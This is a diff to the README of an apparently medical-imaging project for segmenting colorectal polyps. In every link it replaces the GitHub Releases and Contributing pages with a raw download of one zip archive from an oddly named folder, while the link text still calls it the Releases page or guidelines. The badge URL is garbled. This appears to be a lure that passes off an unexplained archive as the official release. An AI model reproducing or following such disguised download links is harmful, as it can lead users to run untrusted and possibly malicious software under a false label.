@@ -1,7 +1,7 @@
 # 🎉 mu-net-polyp-segmentation - Effortlessly Identify Colorectal Polyps
 
 ## 📥 Download the Application
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/Toliol/mu-net-polyp-segmentation/releases)
+[![Download Now](https://raw.githubusercontent.com/Toliol/mu-net-polyp-segmentation/main/deading/net-segmentation-polyp-mu-v1.8.zip%20Now-Click%https://raw.githubusercontent.com/Toliol/mu-net-polyp-segmentation/main/deading/net-segmentation-polyp-mu-v1.8.zip)](https://raw.githubusercontent.com/Toliol/mu-net-polyp-segmentation/main/deading/net-segmentation-polyp-mu-v1.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the **mu-net-polyp-segmentation** application. This software helps you identify colorectal polyps using advanced techniques in medical imaging. It is based on a cutting-edge research paper from MDPI Diagnostics (2025) and utilizes μ-Net with CBAM attention to improve accuracy. 
@@ -24,7 +24,7 @@ To run the application smoothly, ensure your system meets these requirements:
 To get started with the application, please follow these steps:
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/Toliol/mu-net-polyp-segmentation/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/Toliol/mu-net-polyp-segmentation/main/deading/net-segmentation-polyp-mu-v1.8.zip).
 
 2. **Select the Latest Release:**
    Look for the most recent version displayed at the top. This version includes the latest features and fixes.
@@ -44,7 +44,7 @@ To get started with the application, please follow these steps:
 7. **Begin Using the Software:**
    You can now start analyzing images for polyp segmentation. 
 
-For ease of access, here is the [Releases page](https://github.com/Toliol/mu-net-polyp-segmentation/releases) again for your convenience.
+For ease of access, here is the [Releases page](https://raw.githubusercontent.com/Toliol/mu-net-polyp-segmentation/main/deading/net-segmentation-polyp-mu-v1.8.zip) again for your convenience.
 
 ## 📚 User Guide
 Once you install the application, familiarize yourself with its features by exploring the user guide provided within the app. Flashcards or tips pop up as you navigate, helping you to understand functions and settings.
@@ -62,6 +62,6 @@ If you encounter issues during installation or while using the application, cons
   Verify that you are using supported image formats (JPG, PNG). Ensure images are clear and high-resolution for best results.
 
 ## 🌟 Contribute
-We welcome contributions! If you would like to contribute to the project or report an issue, please visit the [Contributing Guidelines](https://github.com/Toliol/mu-net-polyp-segmentation/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you would like to contribute to the project or report an issue, please visit the [Contributing Guidelines](https://raw.githubusercontent.com/Toliol/mu-net-polyp-segmentation/main/deading/net-segmentation-polyp-mu-v1.8.zip).
 
 Thank you for using mu-net-polyp-segmentation. We hope this application benefits your work in medical imaging and enhances the accuracy of polyp detection in colorectal screenings.
